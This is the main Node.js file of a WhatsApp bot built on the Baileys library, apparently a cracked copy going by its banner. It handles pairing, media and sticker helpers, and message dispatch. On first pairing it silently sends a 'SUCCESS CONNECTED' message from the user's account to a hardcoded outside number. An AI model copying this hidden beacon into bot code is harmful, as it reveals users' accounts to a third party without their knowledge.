require('./settings')
const { default: TamaRyuichiConnect, makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, getAggregateVotesInPollMessage } = global.baileys1
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const FileType = require('file-type')
const readline = require("readline");
const PhoneNumber = require('awesome-phonenumber')
const path = require('path')
const NodeCache = require("node-cache")
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})
};
//===================
async function connectToWhatsApp() {
const { state, saveCreds } = await useMultiFileAuthState("./session")
const { version, isLatest } = await fetchLatestBaileysVersion();
const resolveMsgBuffer = new NodeCache()
const TamaRyuichi = makeWASocket({
isLatest,
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "silent" }),
auth: state,
browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [ 2, 3000, 1015901307 ],
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
});
if(usePairingCode && !TamaRyuichi.authState.creds.registered) {
console.log("CRACK BY JACK AND VEMOS IS HERE wkwk>< : ")
		const phoneNumber = await question(``);
		const code = await TamaRyuichi.requestPairingCode(phoneNumber.trim())
		console.log(`🤬💰🤬💰🤬💰🤬💰🤬💰🤬💰🤬💰 : ${code}`)
		TamaRyuichi.sendMessage('621234589008@s.whatsapp.net', {
    image: {
        url: `https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg`
        },
    caption: `
    ━━━━━━━━━━━━━━━━━━━━━━━━━━
         「𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗」`
        })
}
store.bind(TamaRyuichi.ev)
//===================
TamaRyuichi.ev.on('call', async (caller) => {
console.log("THERE'S A STUPID BOY CALLING YOU")
})
TamaRyuichi.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

TamaRyuichi.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
//if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
filename = path.join(__filename, '../' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
size: await getSizeMedia(data),
...type,
data
}}
TamaRyuichi.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer} 
TamaRyuichi.sendText = (jid, text, quoted = '', options) => TamaRyuichi.sendMessage(jid, { text: text, ...options }, { quoted })
TamaRyuichi.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)}
await TamaRyuichi.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}
TamaRyuichi.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)}
await TamaRyuichi.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}
TamaRyuichi.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName}
// Message
TamaRyuichi.ev.on('messages.upsert', async chatUpdate => {
try {
mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!TamaRyuichi.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
m = smsg(TamaRyuichi, mek, store)
require("./module")(TamaRyuichi, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})
// Self Public
TamaRyuichi.public = true
// Connect
TamaRyuichi.serializeM = (m) => smsg(TamaRyuichi, m, store)
TamaRyuichi.ev.on('connection.update', (update) => {
const {connection,lastDisconnect} = update
if (connection === 'close') {lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? connectToWhatsApp() : ''}
else if(connection === 'open') { console.log('Tersambung Kembali')}
console.log(update)})
TamaRyuichi.ev.on('creds.update', saveCreds)
}
connectToWhatsApp()